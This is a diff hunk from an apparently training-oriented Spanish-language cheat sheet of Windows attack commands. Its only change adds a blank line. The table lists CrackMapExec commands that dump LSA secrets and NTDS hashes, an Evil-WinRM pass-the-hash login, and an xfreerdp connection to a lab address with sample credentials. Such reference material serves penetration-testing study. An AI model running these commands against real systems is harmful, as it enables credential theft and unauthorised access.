@@ -59,3 +59,4 @@ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
 | `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Utiliza CrackMapExec junto con las credenciales de administrador para volcar secretos de LSA a través de la red. De esta manera, es posible obtener credenciales sin cifrar.                             |
 | `crackmapexec smb <ip> -u <username> -p <password> --ntds`             | Utiliza CrackMapExec junto con las credenciales de administrador para volcar hashes del archivo ntds a través de una red                                                                                 |
 | `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"`            | Utiliza Evil-WinRM para establecer una sesión de PowerShell con un objetivo de Windows mediante un hash de usuario y contraseña. Este es un tipo de ataque `Pass-The-Hash`.                              |
+
